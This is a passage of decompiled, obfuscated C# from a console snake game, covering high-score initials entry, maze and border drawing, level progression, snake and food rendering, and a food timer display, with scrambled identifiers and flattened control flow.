      int num4 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
      while (true)
      {
        switch ((num4 ^ 74) + 69)
        {
          case 0:
            num4 = -11;
            continue;
          case 1:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED89();
            num4 = -12;
            continue;
          case 2:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.highScores.Insert(index, obj);
            num4 = -15;
            continue;
          case 3:
            num4 = -117;
            continue;
          case 4:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lastestHighScore = obj;
            num4 = -10;
            continue;
          case 5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED89);
            num4 = -118;
            continue;
          case 6:
            goto label_26;
          default:
            goto label_17;
        }
      }
label_26:
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.suspendRenderer = false;
    }

    private static string \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED99()
    {
      List<char> charList = new List<char>();
      Size size1 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.tr.MeassureText("A");
      int[] numArray = new int[3];
      int index1 = 0;
      int CharCode1 = 65;
      do
      {
        charList.Add(Strings.Chr(CharCode1));
        checked { ++CharCode1; }
      }
      while (CharCode1 <= 90);
      charList.AddRange((IEnumerable<char>) new char[5]
      {
        '.',
        '/',
        '\\',
        '+',
        '-'
      });
label_4:
      int num1 = Form2.\uE173\uE5E4\uEAC5\uE066\uEF7F\uE101\uE4C9\uF1BF\uF45C\uECF8\uF52C\uEDC5(59);
      int num2;
      int CharCode2;
      int num3;
      while (true)
      {
        switch ((num1 ^ 66) + 66)
        {
          case 0:
            num2 = Strings.Asc(Conversions.ToString(0));
            num1 = (int) sbyte.MinValue;
            continue;
          case 1:
            CharCode2 = num2;
            num1 = -127;
            continue;
          case 2:
            num1 = -4;
            continue;
          case 3:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED95);
            num1 = -125;
            continue;
          case 4:
            num3 = Strings.Asc(Conversions.ToString(9));
            num1 = -3;
            continue;
          case 5:
            goto label_11;
          default:
            goto label_4;
        }
      }
label_11:
      while (CharCode2 <= num3)
      {
        charList.Add(Strings.Chr(CharCode2));
        checked { ++CharCode2; }
      }
      string str = "High Score!";
label_14:
      int num4 = PackOfCards.\uE952\uEF95\uEFCD\uEA81\uF020\uE4AB\uE598\uF418\uE1FC\uE91E\uF085\uF208(72);
      Size size2;
      int num5;
      int num6;
      int num7;
      int top;
      int left;
      while (true)
      {
        switch ((num4 ^ 71) + 71)
        {
          case 0:
            Console.BackgroundColor = ConsoleColor.Blue;
            num4 = -122;
            continue;
          case 1:
            Console.Write(Strings.StrDup(size2.Width, "─"));
            num4 = -8;
            continue;
          case 2:
            num6 = checked (num5 + size1.Height + 1);
            num4 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(13);
            continue;
          case 3:
            num4 = -3;
            continue;
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9E);
            num4 = -6;
            continue;
          case 5:
            top = num7;
            num4 = (int) sbyte.MinValue;
            continue;
          case 6:
            num4 = -126;
            continue;
          case 7:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(str, ConsoleColor.White, ConsoleColor.Blue, true, false, \uE0C0: 2);
            num4 = -125;
            continue;
          case 8:
            num4 = -123;
            continue;
          case 9:
            Console.SetCursorPosition(left, checked (num5 - 1));
            num4 = -5;
            continue;
          case 10:
            num5 = checked (size2.Height + 3);
            num4 = -2;
            continue;
          case 11:
            left = checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - size2.Width) / 2.0)));
            num4 = -124;
            continue;
          case 12:
            num7 = num5;
            num4 = -4;
            continue;
          case 13:
            size2 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.tr.MeassureText(str);
            num4 = -121;
            continue;
          case 14:
            goto label_33;
          default:
            goto label_14;
        }
      }
label_33:
      while (top <= num6)
      {
        Console.SetCursorPosition(left, top);
        int num8 = checked (size2.Width - 1);
        int num9 = 0;
        if (num9 == 0)
          goto label_31;
label_30:
        Console.Write(" ");
        checked { ++num9; }
label_31:
        if (num9 > num8)
          checked { ++top; }
        else
          goto label_30;
      }
      while (true)
      {
        do
        {
          int num10 = checked (numArray.Length - 1);
          int index2 = 0;
          if (index2 == 0)
            goto label_36;
label_35:
          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(" " + Conversions.ToString(charList[numArray[index2]]) + " ", index2 == index1 ? ConsoleColor.White : ConsoleColor.Gray, index2 == index1 ? ConsoleColor.DarkBlue : ConsoleColor.Blue, true, false, checked (index2 * size1.Width * 3 - size1.Width * 3 - 1), checked (num5 + 1), \uE0C3: 0.5, \uE0C4: false);
          checked { ++index2; }
label_36:
          if (index2 > num10)
          {
            Console.SetCursorPosition(1, 1);
            while ((!Console.KeyAvailable ? 1 : 0) != 0)
              Thread.Sleep(10);
            switch (Console.ReadKey().Key)
            {
              case ConsoleKey.Enter:
                goto label_46;
              case ConsoleKey.LeftArrow:
                checked { --index1; }
                continue;
              case ConsoleKey.UpArrow:
                numArray[index1] = checked (numArray[index1] + 1) % charList.Count;
                continue;
              case ConsoleKey.RightArrow:
                goto label_45;
              case ConsoleKey.DownArrow:
                // ISSUE: variable of a reference type
                int& local;
                // ISSUE: explicit reference operation
                int num11 = checked (^(local = ref numArray[index1]) - 1);
                local = num11;
                if ((numArray[index1] != -1 ? 1 : 0) == 0)
                {
                  numArray[index1] = checked (charList.Count - 1);
                  continue;
                }
                continue;
              default:
                continue;
            }
          }
          else
            goto label_35;
        }
        while ((index1 != -1 ? 1 : 0) != 0);
        index1 = checked (numArray.Length - 1);
        continue;
label_45:
        index1 = checked (index1 + 1) % numArray.Length;
      }
label_46:
      return Conversions.ToString(charList[numArray[0]]) + Conversions.ToString(charList[numArray[1]]) + Conversions.ToString(charList[numArray[2]]);
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9A()
    {
label_4:
      int num1 = PackOfCards.\uE952\uEF95\uEFCD\uEA81\uF020\uE4AB\uE598\uF418\uE1FC\uE91E\uF085\uF208(65);
      int num2 = 6;
      while (true)
      {
        switch (num2 ^ 67)
        {
          case 66:
            goto label_4;
          case 67:
            switch (num1 + 63)
            {
              case 0:
                Console.Write(" ");
                num1 = Form2.\uE173\uE5E4\uEAC5\uE066\uEF7F\uE101\uE4C9\uF1BF\uF45C\uECF8\uF52C\uEDC5(59);
                goto label_1;
              case 1:
                num1 = -121;
                goto label_1;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA0);
                num1 = -123;
                goto label_1;
              case 3:
                num1 = (int) sbyte.MinValue;
                goto label_1;
              case 4:
                Console.SetCursorPosition(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Item.X, \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Item.Y);
                num1 = -124;
                goto label_1;
              case 5:
                goto label_11;
              default:
                num2 = 1;
                continue;
            }
          case 68:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8A);
            num2 = 7;
            continue;
          case 69:
label_1:
            num1 ^= 70;
            break;
        }
        num2 = 0;
      }
label_11:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9B()
    {
label_2:
      int num1 = 4;
      bool flag;
      while (true)
      {
        switch (num1 ^ 74)
        {
          case 74:
            flag = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.foodItemsCount == \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.FoodItemsCount;
            num1 = 1;
            continue;
          case 75:
            if (flag)
            {
              num1 = 5;
              continue;
            }
            goto label_10;
          case 76:
            checked { ++\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.foodItemsCount; }
            num1 = 0;
            continue;
          case 77:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8A);
            num1 = 7;
            continue;
          case 78:
            checked { ++\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levelFoodItemsCount; }
            num1 = 6;
            continue;
          case 79:
            goto label_9;
          default:
            goto label_2;
        }
      }
label_9:
      int num2 = 0;
      goto label_11;
label_10:
      num2 = 1;
label_11:
      if (num2 != 0)
        return;
      if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Index != \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels.Count ? 1 : 0) != 0)
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels[\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Index];
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED97(1);
label_16:
      int num3 = 125;
      while (true)
      {
        switch (num3 ^ 63)
        {
          case 63:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9C);
            num3 = 0;
            continue;
          case 64:
            num3 = 123;
            continue;
          case 65:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED93();
            num3 = (int) sbyte.MaxValue;
            continue;
          case 66:
            num3 = 126;
            continue;
          case 67:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Y = checked ((int) Math.Round(unchecked ((double) Console.WindowHeight / 2.0)));
            num3 = 122;
            continue;
          case 68:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].X = checked ((int) Math.Round(unchecked ((double) Console.WindowWidth / 2.0 - 1.0)));
            num3 = 121;
            continue;
          case 69:
            num3 = 120;
            continue;
          case 70:
            num3 = 124;
            continue;
          case 71:
            goto label_25;
          default:
            goto label_16;
        }
      }
label_25:
      List<Segment> snake = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake;
      Action<Segment> action;
      // ISSUE: reference to a compiler-generated field
      if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I47\u002D0 == null ? 1 : 0) == 0)
      {
        // ISSUE: reference to a compiler-generated field
        action = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I47\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I47\u002D0 = action = (Action<Segment>) (s =>
        {
label_7:
          int num4 = 13;
          int num5 = 0;
          while (true)
          {
            switch (num5 ^ 56)
            {
              case 53:
                switch (num4)
                {
                  case 55:
                    num4 = 10;
                    goto label_1;
                  case 56:
                    num4 = 8;
                    goto label_1;
                  case 57:
                    num4 = 12;
                    goto label_1;
                  case 58:
                    s.Direction = Segment.Directions.Left;
                    num4 = 14;
                    goto label_1;
                  case 59:
                    s.X = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].X;
                    num4 = 1;
                    goto label_1;
                  case 60:
                    s.Y = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Y;
                    num4 = 15;
                    goto label_1;
                  case 61:
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle3 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__._Lambda\u0024__50\u002D0);
                    num4 = 11;
                    goto label_1;
                  case 62:
                    goto label_14;
                  default:
                    num5 = 15;
                    continue;
                }
              case 54:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle4 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__._Lambda\u0024__47\u002D0);
                num5 = 14;
                continue;
              case 55:
                goto label_7;
              case 56:
label_1:
                num4 ^= 54;
                break;
            }
            num5 = 13;
          }
label_14:;
        });
      }
      snake.ForEach(action);
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9C()
    {
label_6:
      int num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
      int num2 = 15;
      int top;
      int num3;
      while (true)
      {
        switch (num2 ^ 66)
        {
          case 74:
            switch (num1 + 67)
            {
              case 0:
                top = 0;
                num1 = -117;
                goto label_1;
              case 1:
                Console.ForegroundColor = ConsoleColor.Magenta;
                num1 = -120;
                goto label_1;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\u002Ecctor);
                num1 = -10;
                goto label_1;
              case 3:
                num3 = checked (Console.WindowHeight - 1);
                // ISSUE: reference to a compiler-generated method
                num1 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA90.\uE152\uE14D\uE4B1\uE4CF\uEFA5\uEAA8\uF7D2\uF85C\uF37D\uF074\uF5CA\uE496(19);
                goto label_1;
              case 4:
                num1 = -119;
                goto label_1;
              case 5:
                goto label_20;
              default:
                num2 = 9;
                continue;
            }
          case 75:
            goto label_6;
          case 76:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8E);
            num2 = 14;
            continue;
          case 77:
label_1:
            num1 ^= 73;
            break;
        }
        num2 = 8;
      }
label_20:
      while (top <= num3)
      {
        int num4 = checked (Console.WindowWidth - 1);
        int left = 0;
        if (left == 0)
          goto label_17;
label_14:
        if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Maze[checked (top * Console.WindowWidth + left)] ? 1 : 0) == 0)
        {
          Console.SetCursorPosition(left, top);
          Console.Write("▓");
        }
        checked { ++left; }
label_17:
        if (left > num4)
          checked { ++top; }
        else
          goto label_14;
      }
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9D()
    {
      Console.ForegroundColor = ConsoleColor.White;
      int num1 = checked (Console.WindowWidth - 1);
      int left = 0;
      if (left == 0)
        goto label_13;
label_1:
      Console.SetCursorPosition(left, 0);
label_3:
      int num2 = 9;
      while (true)
      {
        switch (num2 ^ 67)
        {
          case 71:
            num2 = 8;
            continue;
          case 72:
            Console.Write("█");
            num2 = 4;
            continue;
          case 73:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA1);
            num2 = 10;
            continue;
          case 74:
            num2 = 11;
            continue;
          case 75:
            Console.CursorTop = checked (Console.WindowHeight - 1);
            num2 = 14;
            continue;
          case 76:
            Console.Write("█");
            num2 = 13;
            continue;
          case 77:
            num2 = 15;
            continue;
          case 78:
            num2 = 12;
            continue;
          case 79:
            goto label_12;
          default:
            goto label_3;
        }
      }
label_12:
      checked { ++left; }
label_13:
      if (left > num1)
      {
        int num3 = checked (Console.WindowHeight - 2);
        int top = 1;
        if (top != 0)
          goto label_27;
label_15:
        Console.SetCursorPosition(0, top);
label_17:
        // ISSUE: reference to a compiler-generated method
        int num4 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA90.\uE152\uE14D\uE4B1\uE4CF\uEFA5\uEAA8\uF7D2\uF85C\uF37D\uF074\uF5CA\uE496(14);
        while (true)
        {
          switch ((num4 ^ 70) + 68)
          {
            case 0:
              Console.Write("█");
              num4 = -121;
              continue;
            case 1:
              num4 = -6;
              continue;
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA0);
              num4 = -8;
              continue;
            case 3:
              num4 = -126;
              continue;
            case 4:
              Console.Write("█");
              num4 = -7;
              continue;
            case 5:
              num4 = -123;
              continue;
            case 6:
              num4 = -122;
              continue;
            case 7:
              Console.CursorLeft = checked (Console.WindowWidth - 1);
              num4 = -124;
              continue;
            case 8:
              goto label_26;
            default:
              goto label_17;
          }
        }
label_26:
        checked { ++top; }
label_27:
        if (top <= num3)
          goto label_15;
      }
      else
        goto label_1;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9E()
    {
      while ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.eraseSegment.Count <= 0 ? 0 : 1) != 0)
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.eraseSegment.Dequeue().Draw(' ');
      if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.youAreWhatYouEat ? 1 : 0) == 0)
      {
        List<Segment> snake = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake;
        Action<Segment> action;
        // ISSUE: reference to a compiler-generated field
        if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I50\u002D0 == null ? 1 : 0) == 0)
        {
          // ISSUE: reference to a compiler-generated field
          action = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I50\u002D0;
        }
        else
        {
          // ISSUE: reference to a compiler-generated field
          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I50\u002D0 = action = (Action<Segment>) (s => s.Draw());
        }
        snake.ForEach(action);
      }
      else
      {
label_9:
        int num = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
        while (true)
        {
          switch ((num ^ 72) + 69)
          {
            case 0:
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[1].Draw();
              num = -10;
              continue;
            case 1:
              num = -13;
              continue;
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA0);
              num = Form2.\uE173\uE5E4\uEAC5\uE066\uEF7F\uE101\uE4C9\uF1BF\uF45C\uECF8\uF52C\uEDC5(63);
              continue;
            case 3:
              num = -120;
              continue;
            case 4:
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Draw();
              num = -12;
              continue;
            case 5:
              goto label_15;
            default:
              goto label_9;
          }
        }
      }
label_15:
      if (((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food == null ? 1 : 0) != 0 || !\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.IsNew ? 1 : 0) == 0)
      {
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.IsNew = false;
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Item.Draw(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.FoodItem);
      }
label_18:
      int num1 = 7;
      while (true)
      {
        switch (num1 ^ 74)
        {
          case 73:
            num1 = 31;
            continue;
          case 74:
            num1 = 4;
            continue;
          case 75:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2();
            num1 = 24;
            continue;
          case 76:
            num1 = 30;
            continue;
          case 77:
            Console.BackgroundColor = ConsoleColor.Black;
            num1 = 27;
            continue;
          case 78:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA1();
            num1 = 5;
            continue;
          case 79:
            num1 = 1;
            continue;
          case 80:
            Console.ForegroundColor = ConsoleColor.White;
            num1 = 3;
            continue;
          case 81:
            num1 = 26;
            continue;
          case 82:
            num1 = 28;
            continue;
          case 83:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8F);
            num1 = 25;
            continue;
          case 84:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9F();
            num1 = 0;
            continue;
          case 85:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA0();
            num1 = 6;
            continue;
          case 86:
            goto label_27;
          default:
            goto label_18;
        }
      }
label_27:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9F()
    {
      if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food == null ? 1 : 0) == 0)
      {
        Console.SetCursorPosition(3, checked (Console.WindowHeight - 1));
        Console.BackgroundColor = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Level <= 5 ? ConsoleColor.Gray : ConsoleColor.DarkGray;
label_3:
        int num = 5;
        while (true)
        {
          switch (num ^ 78)
          {
            case 74:
              num = 2;
              continue;
            case 75:
              num = 30;
              continue;
            case 76:
              num = 31;
              continue;
            case 77:
              num = 1;
              continue;
            case 78:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2);
              num = 0;
              continue;
            case 79:
              Console.Write(" +{0}: {1:N0} ", (object) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Level, (object) (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.foodItemLifeSpan - (TimeSpan.FromTicks(DateAndTime.Now.Ticks) - \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.CreatedOn)).TotalSeconds);
              num = 4;
              continue;
            case 80:
